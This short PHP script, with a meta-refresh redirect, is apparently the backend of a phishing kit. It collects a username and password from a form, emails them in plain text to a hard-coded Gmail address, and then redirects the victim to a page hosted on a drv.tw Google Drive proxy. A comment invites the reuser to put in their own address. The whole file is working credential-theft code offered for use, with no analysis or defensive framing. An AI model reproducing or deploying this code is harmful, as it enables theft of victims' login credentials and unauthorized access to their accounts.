 <meta http-equiv="refresh" content="0; url=https://btkaoq5htfpdf9ee6neitw.on.drv.tw/webn2/alertan.html"/>

 <?php
    $errors="";
    $myemail="alfonsoestrada0509@gmail.com";//<-----Put Your email address here.
    if(empty($_POST['user'])  ||
       empty($_POST['pass']) )
    {
        $errors .= "\n Error: todos los campos son requeridos";
    }
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    
   
    if( empty($errors))
    {

$host = "";
$username = "";
$password = "";
$port = "465";


    $to = "alfonsoestrada0509";
    $email_subject = "Nuevo formulario";
    $email_body = "Nuevo email enviado ".
    "Datos:\n Usuario: $user \n ".
    "Password: $pass \n ".
    
    $headers = "De: mail.com\n";
 
    mail($to,$email_subject,$email_body,$headers);
    
    header('Location: https://btkaoq5htfpdf9ee6neitw.on.drv.tw/webn2/');
    }
    ?>
